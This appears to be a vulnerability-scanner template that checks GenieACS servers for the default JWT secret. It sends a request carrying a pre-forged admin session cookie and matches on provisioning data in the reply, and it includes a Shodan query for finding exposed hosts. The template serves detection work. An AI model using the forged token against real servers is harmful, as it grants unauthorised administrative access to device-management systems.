id: genieacs-default-jwt

info:
  name: GenieACS - Default JWT Secret
  author: DhiyaneshDK,pussycat0x
  severity: high
  reference:
    - https://0x00sec.org/t/genieacs-and-the-tale-of-default-jwt-secret/32738
  metadata:
    max-request: 1
    verified: "true"
    shodan-query: http.html:"genieacs"
  tags: misconfig,jwt,genieacs,default-jwt

http:
  - raw:
      - |
        GET /api/presets/?filter=true HTTP/1.1
        Host: {{Hostname}}
        Accept: application/json, text/*
        Cookie: genieacs-ui-jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwiYXV0aE1ldGhvZCI6ImxvY2FsIiwiaWF0IjoxNzgyNTc0NDEyfQ.y2JaygP5n4WBYQ_dytgS0qet0b6KvtT31UJWqee4L6c

    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - '"provision":'
          - '"provisionArgs":'
        condition: and

      - type: word
        part: header
        words:
          - application/json

      - type: status
        status:
          - 200
